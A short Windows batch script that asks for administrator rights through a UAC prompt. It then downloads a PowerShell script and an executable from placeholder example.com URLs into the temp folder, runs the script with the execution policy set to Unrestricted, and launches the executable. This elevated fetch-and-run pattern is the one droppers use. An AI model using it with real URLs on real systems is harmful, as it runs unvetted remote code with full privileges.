@echo off
setlocal

:: Check for administrative privileges
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process '%~s0' -Verb RunAs -ArgumentList 'restarted'"
    exit /b
)

:: Only run this section with elevated privileges
if "%1"=="restarted" (
    echo Running with elevated privileges

    :: Configure download URLs and file paths
    set "PS1_URL=https://example.com/script.ps1"
    set "EXE_URL=https://example.com/program.exe"
    set "PS1_FILE=%temp%\script.ps1"
    set "EXE_FILE=%temp%\program.exe"

    :: Download files using PowerShell
    echo Downloading files...
    powershell -Command "Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%PS1_FILE%'"
    powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_FILE%'"

    :: Execute PowerShell script with unrestricted policy
    echo Executing PowerShell script...
    powershell -ExecutionPolicy Unrestricted -File "%PS1_FILE%"

    :: Wait for 60 seconds
    echo Waiting for 60 seconds...
    timeout /t 60 /nobreak >nul

    :: Execute the downloaded program
    echo Launching executable...
    start "" "%EXE_FILE%"
)

endlocal